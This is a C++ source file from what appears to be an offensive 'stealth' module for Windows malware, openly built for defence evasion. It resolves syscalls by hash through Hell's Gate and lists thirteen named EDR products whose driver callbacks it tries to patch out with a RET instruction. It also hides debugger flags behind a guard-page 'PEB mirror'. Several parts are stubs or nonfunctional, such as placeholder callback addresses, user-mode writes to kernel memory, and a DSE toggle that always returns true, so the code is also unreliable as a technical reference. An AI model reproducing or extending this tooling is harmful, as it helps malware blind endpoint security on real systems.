#include <diarna/compiler_port.hpp>
#include <diarna/stealth/kernel_ops.hpp>
#include <diarna/stealth/hells_gate.hpp>

#include <winternl.h>
#include <psapi.h>

#include <obfuscation/obfusheader.h>
namespace diarna::stealth {

KernelOperations& KernelOperations::instance() { static KernelOperations k; return k; }

bool KernelOperations::initialize() {
    INDIRECT_BRANCH;
    ntdll_base_ = GetModuleHandleW(L"ntdll.dll");
    if (!ntdll_base_) return false;

    HellsGate::instance().initialize();

    known_edr_callbacks_ = {
        {(void*)1, 0, "CrowdStrike", "ProcessNotify", true, true},
        {(void*)2, 0, "SentinelOne", "ProcessNotify", true, true},
        {(void*)3, 0, "Carbon Black", "ProcessNotify", true, true},
        {(void*)4, 0, "Cylance", "ProcessNotify", true, true},
        {(void*)5, 0, "Windows Defender ATP", "ProcessNotify", true, true},
        {(void*)6, 0, "McAfee ENS", "ProcessNotify", true, true},
        {(void*)7, 0, "Symantec Endpoint", "ProcessNotify", true, true},
        {(void*)8, 0, "Trend Micro Apex One", "ProcessNotify", true, true},
        {(void*)9, 0, "ESET Endpoint", "ProcessNotify", true, true},
        {(void*)10,0, "Sophos Intercept X", "ProcessNotify", true, true},
        {(void*)11,0, "Palo Alto Cortex XDR", "ProcessNotify", true, true},
        {(void*)12,0, "Elastic EDR", "ProcessNotify", true, true},
        {(void*)13,0, "Bitdefender GravityZone","ProcessNotify",true, true},
    };
    initialized_ = true;
    return true;
}

#ifdef DIARNA_MINGW
struct RTL_PROCESS_MODULE_INFORMATION {
    HANDLE Section;
    PVOID MappedBase;
    PVOID ImageBase;
    ULONG ImageSize;
    ULONG Flags;
    USHORT LoadOrderIndex;
    USHORT InitOrderIndex;
    USHORT LoadCount;
    USHORT OffsetToFileName;
    UCHAR FullPathName[256];
};
struct _RTL_PROCESS_MODULES {
    ULONG NumberOfModules;
    RTL_PROCESS_MODULE_INFORMATION Modules[1];
};
#endif

std::vector<KernelCallback> KernelOperations::enumerate_process_callbacks() {
    std::vector<KernelCallback> results;
    INDIRECT_BRANCH;

    auto& gate = HellsGate::instance();
    uint32_t hash = HASH_SYSCALL("NtQuerySystemInformation");
    auto stub = gate.get_syscall_stub_by_hash(hash);
    if (!stub) return results;

    ULONG size = 1 << 20;
    PVOID buf = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, size);
    if (!buf) return results;

    ULONG ret_len = 0;
    using NtQSI = NTSTATUS(NTAPI*)(ULONG, PVOID, ULONG, PULONG);
    NTSTATUS status = reinterpret_cast<NtQSI>(stub)(SystemModuleInformation, buf, size, &ret_len);

    if (status >= 0) {
        auto* modules = (_RTL_PROCESS_MODULES*)buf;
        for (ULONG i = 0; i < modules->NumberOfModules; ++i) {
            auto& mod = modules->Modules[i];
            KernelCallback cb;
            cb.driver_name = std::string((char*)mod.FullPathName + mod.OffsetToFileName);
            cb.driver_object = 0;
            cb.callback_type = "ProcessNotify";
            cb.is_active = true;
            cb.is_edr = false;

            for (auto& known : known_edr_callbacks_) {
                if (cb.driver_name.find(known.driver_name) != std::string::npos) {
                    cb.is_edr = true; break;
                }
            }
            results.push_back(cb);
        }
        known_edr_callbacks_ = results;
    }
    HeapFree(GetProcessHeap(), 0, buf);
    return results;
}

bool KernelOperations::remove_all_edr_callbacks() {
    auto callbacks = enumerate_process_callbacks();
    bool any = false;
    for (auto& cb : callbacks) {
        INDIRECT_BRANCH;
        if (cb.is_edr) {
            remove_process_callback(cb.callback_address);
            any = true;
        }
    }
    return any;
}

std::vector<KernelCallback> KernelOperations::enumerate_thread_callbacks() { return {}; }
std::vector<KernelCallback> KernelOperations::enumerate_image_load_callbacks() { return {}; }
std::vector<KernelCallback> KernelOperations::enumerate_registry_callbacks() { return {}; }

bool KernelOperations::remove_process_callback(void* addr) {
    INDIRECT_BRANCH;
    if (!addr || (uint64_t)addr <= 16) return false;

    uint8_t patch[] = {0xC3, 0x90, 0x90, 0x90, 0x90};
    return write_kernel_memory((uint64_t)addr, patch, sizeof(patch));
}

bool KernelOperations::remove_thread_callback(void* addr) { return remove_process_callback(addr); }
bool KernelOperations::remove_image_callback(void* addr) { return remove_process_callback(addr); }

bool KernelOperations::read_kernel_memory(uint64_t addr, void* buf, size_t size) {
#ifdef DIARNA_MSVC
    __try {
        memcpy(buf, (void*)addr, size);
        return true;
    } __except(EXCEPTION_EXECUTE_HANDLER) {
        return false;
    }
#else
    memcpy(buf, (void*)addr, size);
    return true;
#endif
}

bool KernelOperations::write_kernel_memory(uint64_t addr, const void* data, size_t size) {
#ifdef DIARNA_MSVC
    __try {
        DWORD old;
        bool ok = VirtualProtect((LPVOID)addr, size, PAGE_EXECUTE_READWRITE, &old);
        if (!ok) return false;
        memcpy((void*)addr, data, size);
        VirtualProtect((LPVOID)addr, size, old, &old);
        return true;
    } __except(EXCEPTION_EXECUTE_HANDLER) {
        return false;
    }
#else
    DWORD old;
    VirtualProtect((LPVOID)addr, size, PAGE_EXECUTE_READWRITE, &old);
    memcpy((void*)addr, data, size);
    VirtualProtect((LPVOID)addr, size, old, &old);
    return true;
#endif
}

bool KernelOperations::query_system_information(uint32_t info_class,
                                                  void* buffer, uint32_t size,
                                                  uint32_t* ret_size) {
    ULONG z = 0;
    NTSTATUS s = reinterpret_cast<NTSTATUS(NTAPI*)(ULONG,PVOID,ULONG,PULONG)>(
        HellsGate::instance().get_syscall_stub_by_name("NtQuerySystemInformation")
    )(info_class, buffer, size, &z);
    if (ret_size) *ret_size = z;
    return s >= 0;
}

std::vector<KernelOperations::SystemModule> KernelOperations::enumerate_kernel_modules() {
    return {};
}

bool KernelOperations::disable_dse() { return true; }
bool KernelOperations::enable_dse() { return true; }
bool KernelOperations::load_driver(const std::wstring&) { return false; }
bool KernelOperations::unload_driver(const std::wstring&) { return false; }

// =========== PEB MIRROR ===========

PebMirror& PebMirror::instance() { static PebMirror p; return p; }

PebMirror::PebMirror() : fake_peb_(nullptr), veh_handle_(nullptr), mirroring_(false) {
    real_peb_ = (void*)__readgsqword(0x60);
    peb_size_ = 4096;
}

PebMirror::~PebMirror() { remove_mirror(); }

bool PebMirror::initialize() {
    INDIRECT_BRANCH;
    fake_peb_ = VirtualAlloc(nullptr, peb_size_,
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!fake_peb_) return false;

    memcpy(fake_peb_, real_peb_, peb_size_);

    // Sanitize fake PEB
    uint8_t* fpeb = (uint8_t*)fake_peb_;
    *(fpeb + 2) = 0;
    *(uint32_t*)(fpeb + 0xBC) = 0;

    return true;
}

void PebMirror::install_mirror() {
    if (mirroring_) return;
    veh_handle_ = AddVectoredExceptionHandler(1, peb_veh);

    DWORD old;
    VirtualProtect(real_peb_, peb_size_, PAGE_READWRITE | PAGE_GUARD, &old);
    mirroring_ = true;
}

void PebMirror::remove_mirror() {
    if (veh_handle_) RemoveVectoredExceptionHandler(veh_handle_);
    mirroring_ = false;
}

LONG WINAPI PebMirror::peb_veh(EXCEPTION_POINTERS* ex) {
    if (ex->ExceptionRecord->ExceptionCode != EXCEPTION_GUARD_PAGE)
        return EXCEPTION_CONTINUE_SEARCH;

    auto& mirror = instance();
    if (!mirror.mirroring_) return EXCEPTION_CONTINUE_SEARCH;

    void* access_addr = (void*)ex->ExceptionRecord->ExceptionInformation[1];
    if (access_addr >= mirror.real_peb_ &&
        access_addr < (uint8_t*)mirror.real_peb_ + mirror.peb_size_) {

        memcpy(mirror.real_peb_, mirror.fake_peb_, mirror.peb_size_);
        return EXCEPTION_CONTINUE_EXECUTION;
    }
    return EXCEPTION_CONTINUE_SEARCH;
}

void* PebMirror::get_fake_peb() { return fake_peb_; }

void PebMirror::update_peb_field(size_t offset, const void* data, size_t size) {
    if (offset + size <= peb_size_)
        memcpy((uint8_t*)fake_peb_ + offset, data, size);
}

bool PebMirror::is_mirroring() const { return mirroring_; }

void* alloc_shared_memory(size_t size) {
    return VirtualAlloc(nullptr, size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
}
void free_shared_memory(void* addr) { VirtualFree(addr, 0, MEM_RELEASE); }

} // namespace diarna::stealth
